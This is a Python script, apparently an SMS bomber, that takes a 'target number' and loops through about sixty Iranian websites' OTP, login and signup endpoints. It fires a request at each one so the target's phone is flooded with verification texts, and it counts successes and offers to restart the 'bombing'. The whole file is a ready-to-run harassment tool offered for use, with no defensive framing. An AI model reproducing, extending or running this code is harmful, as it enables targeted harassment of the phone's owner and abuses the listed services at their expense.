import requests
from termcolor import colored
import time


class ValidationError(Exception):
    """Validation error"""


class Bomber(object):
    def __init__(self, number: str, delay: float, timeout: float) -> None:
        self.number = number
        self.delay = delay
        self.timeout = timeout


    def sms(self):
        sites = [ # List of api's (that send message) with them dependencies
            [
            "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
                {
                    "source": "besina",
                    "mobile": self.number
                },
            ],

            [
                "https://www.portal.ir/site/api/v1/user/otp",
                {
                    "template_id": 11111111,
                    "type": "etc", 
                    "category": "etc", 
                    "mobile": self.number, 
                    "name": " "
                },
            ],

            ["https://api.snapp.ir/api/v1/sms/link", {"phone": self.number},],

            ["https://www.sheypoor.com/api/v10.0.0/auth/send", {"username": self.number},],

            ["https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", {"cellphone": self.number.replace("0", "+98", 1)}],

            [
                "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", 
                    {"Parameters": {
                        "ApplicationType": "Web",
                        "ApplicationUniqueToken": "null",
                        "ApplicationVersion": "1.0.0",
                        "MobileNumber": self.number, 
                        "UniqueToken": "null"
                        }
                    }
                ],

            ["https://api.divar.ir/v5/auth/authenticate", {"phone": self.number.lstrip("0")}],

            ["https://football360.ir/api/auth/verify-phone/", {"phone_number": self.number.replace("0", "+98", 1)}],

            [
                "https://virgool.io/api/v1.4/auth/verify",
                {
                    "method": "phone", 
                    "identifier": self.number.replace("0", "+98", 1), 
                    "type": "register"
                }
            ],

            [
                "https://www.snapptrip.com/register",
                {
                    "lang": "fa", 
                    "country_id": "860", 
                    "password": "12345678", 
                    "mobile_phone": self.number.replace("0", "98", 1),
                    "country_code": "+98", 
                    "email": "a@gmail.com"
                }
            ],

            ["https://gw.taaghche.com/v4/site/auth/signup", {"contact": self.number}],

            [
                "https://core.gapfilm.ir/api/v3.1/Account/Login", 
                {
                    "Type": 3, 
                    "Username": self.number.lstrip("0"), 
                    "SourceChannel": "GF_WebSite", 
                    "SourcePlatform": "desktop", 
                    "SourcePlatformAgentType": "Chrome",
                    "SourcePlatformVersion": "111.0.0.0", 
                    "GiftCode": "null"
                }
            ],

            ["https://api.digikalajet.ir/user/login-register/", {"phone": self.number}],

            ["https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", {"mobile": self.number}],

            [
                "https://api.tapsi.cab/api/v2.2/user",
                {
                    "credential": {"phoneNumber": self.number, "role": "PASSENGER"}, 
                    "otpOption": "SMS"
                }
            ],

            ["https://mobapi.banimode.com/api/v2/auth/request", {"phone": self.number}],

            ["https://api.ostadkr.com/login", {"mobile": self.number}],

            [
                "https://www.technolife.ir/shop", 
                {
                    "query": ("query check_customer_exists($username: String ,$repeat:Boolean){\n  check_customer_exists"
                    "(username: $username , repeat:$repeat){\n    result\n    request_id\n    }\n  }"
                    ),
                    "variables": {
                    "username": self.number}, 
                    "g-recaptcha-response": ""
                }
            ],

            [
                "https://www.hamrah-mechanic.com/api/v1/membership/otp",
                {
                    "PhoneNumber": self.number, 
                    "prevDomainUrl": "https://www.google.com/",
                    "landingPageUrl": "https://www.hamrah-mechanic.com/",
                    "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
                    "prevUrl": "https://www.hamrah-mechanic.com/", 
                    "referrer": "https://www.google.com/"
                }
            ],

            ["https://api.mobit.ir/api/web/v8/register/register", {"number": self.number}],

            ["https://auth.basalam.com/otp-request", {"mobile": self.number, "client_id": 11}],

            ["https://www.miare.ir/api/otp/driver/request/", {"phone_number": self.number}],

            ["https://api.vandar.io/account/v1/check/mobile", {"mobile": self.number}],

            ["https://taraazws.jabama.com/api/v4/account/send-code", {"mobile": self.number}],

            [f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={self.number}", None],

            [
                "https://tikban.com/Account/LoginAndRegister",
                {
                    "phoneNumberCode": "+98", 
                    "CellPhone": self.number, 
                    "CaptchaKey": "null", 
                    "JustMobilephone": self.number.lstrip("0")
                }
            ],

            ["https://www.buskool.com/send_verification_code", {"phone": self.number}],

            ["https://api.timcheh.com/auth/otp/send", {"mobile": self.number}],

            ["https://api.sibche.com/profile/sendCode", {"mobile": self.number}],

            ["https://apiwebsite.shavaz.com/Auth/SendConfirmCode", {"mobile": self.number}],

            [
                "https://account.bama.ir/api/otp/generate/v2",
                {
                    "CellNumber": self.number, 
                    "Appname": "bamawebapplication", 
                    "smsfor": 6
                }
            ],

            ["https://pinket.com/api/cu/v2/phone-verification", {"phoneNumber": self.number}],

            [f"https://core.gap.im/v1/user/add.json?mobile=%2B{self.number.replace('0', '+98', 1)}", "GET"],

            ["https://www.karlancer.com/api/register", {"phone": self.number.replace("0", "", 1), "role": "freelancer"}],

            ["https://primashop.ir/index.php?route=extension/module/websky_otp/send_code", {"telephone" : self.number}],

            ["https://api.komodaa.com/api/v2.6/loginRC/request", {"phone_number":self.number}],

            ["https://igame.ir/api/play/otp/send", {"phone": self.number}],

            [
                "https://tahrir-online.ir/wp-admin/admin-ajax.php", 
                {
                    "phone": "+98" + self.number,
                    "form":"register",
                    "action":"mobix_send_otp_code"
                }
            ],

            ["https://hermeskala.com//login/send_vcode", {"mobile_number":  self.number}],

            [
                "https://ickala.com/", 
                {
                    "controller": "SendSMS","fc":"module",
                    "module": "loginbymobile","SubmitSmsSend":"1",
                    "ajax": "true",
                    "otp_mobile_num": self.number
                }
            ],

            [
                f"https://nikanbike.com/?rand={self.number}", 
                {
                    "controller": "authentication",
                    "back":"my-account",
                    "fc":"module",
                    "ajax": "true",
                    "module":"iverify",
                    "phone_mobile": self.number,
                    "SubmitCheck":""
                }
            ],

            [
                "https://www.kanoonbook.ir/store/customer_otp", 
                {"customer_username": self.number,"task":"customer_phone"}
            ],

            ["https://app.itoll.com/api/v1/auth/login", {"mobile":  self.number}],

            [
                "https://gitamehr.ir/wp-admin/admin-ajax.php", 
                {
                    "action": "stm_login_register",
                    "type": "mobile",
                    "input":  self.number,
                }
            ],

            ["https://4hair.ir/user/login.php", {"num":  self.number,"ok":""}],

            ["https://rirabook.com/loginAth", {"mobile1":  self.number,"loginbt1":""}],

            ["https://www.tamimpishro.com/site/api/v1/user/otp", {"mobile":  self.number}],

            ["https://ubike.ir/index.php?route=extension/module/websky_otp/send_code", {"telephone":  self.number}],

            ["https://www.atrinelec.com/ajax/SendSmsVerfiyCode", {"mobile":  self.number}],

            ["https://api.digighate.com/v2/public/code?phone="+ self.number +"", "GET"],

            ["https://api.pooshakshoniz.com/v1/customer/register-login?version=new1", {"mobile":  self.number}],

            ["https://api.benedito.ir/v1/customer/register-login?version=new1", {"mobile":  self.number}],

            [
                "https://www.rubeston.com/api/customers/login-register", 
                {"mobile":  self.number,"step":"1"}
            ],

            ["https://azarbadbook.ir/ajax/login_j_ajax_ver/", {"phone": self.number}],

            [
                "https://myroz.ir/wp-admin/admin-ajax.php", 
                {
                    "action": "stm_login_register",
                    "type": "mobile",
                    "input": self.number.replace("0", "+98", 1)
                }
            ],

            [
                "https://titomarket.com/index.php?route=account/login_verify/verify", 
                {
                    "redirect": "https://titomarket.com/my-account",
                    "telephone": self.number.replace("0", "+98", 1)
                }
            ],

            ["https://shimashoes.com/api/customer/member/register/", { "email": self.number.replace("0", "+98", 1) + self.number}],
        ]

        success_counter = 0
        fail_counter = 0

        # dpc > dependency
        for url, dpc in sites:
            try:
                # If request method is get
                if dpc == "GET":
                    response = requests.get(url=url, timeout=self.timeout)
                # Else, request method must be post
                else:
                    response = requests.post(url=url, json=dpc, timeout=self.timeout)

                if response.status_code == 200: # If message sent successfully
                    success_counter += 1
                    print(colored(f"{url} >>> {response}", color="light_green"))
                else: # If message is not sent
                    fail_counter += 1
                    print(colored(f"{url} >>> {response}", color="light_red"))

                time.sleep(self.delay) # Delay between each message
            except (
                    requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout,
                    requests.exceptions.TooManyRedirects, requests.ConnectionError) as error:
                print(colored(f"{url} >>> {error}", "red"))
                continue

        return (
            success_counter, # Number of messages sent successfully 
            fail_counter #َ And those that failed
        )  


if __name__ == "__main__":
    try : # Getting data from terminal
        number = input("Enter target number (09123456789) >>> ")
        if not number.startswith("09"):
            raise ValidationError(f"Target number ({number}) is not a valid number!")
        if not len(number) == 11:
            raise ValidationError(f"Target number ({number}) must have 11 characters!")

        delay = float(input("Enter the delay between each requests >>> "))
        if delay < 0:
            raise ValidationError(f"Delay ({delay}) must be positive!")

        timeout = float(input("How long should each request take? >>> "))
        if timeout < 0:
            raise ValidationError(f"Timeout ({timeout}) must be positive!")
    except KeyboardInterrupt: # If user stopped the program (ctrl + c)
        print(colored("\nProgram STOPPED by user!", "red"))
        exit()

    bomb = Bomber(number, delay, timeout) # Create a bomber

    start = True
    while start:
        print(colored("####################\n  Program started :\n", "green"))
        try:
            success, fail = bomb.sms() # Start bombing
        except KeyboardInterrupt: # If user stopped the proccess of bombing
            print(colored("############################\n  Proccess STOPPED by user!", "red"))
            exit()
        else: # If proccess completed successfully (User did not stop it)
            print(colored("#######################\n  Proccess COMPLETED!\n#######################\n", "green"))
        print(colored(f"Number of successful messages : {success}", "green"))
        print(colored(f"Number of failed messages : {fail}", "red"))

        cont = input("Do you want to restart the proccess ? [Y/n]>>> ")
        if cont.lower().startswith("n") or cont == "0": start = False
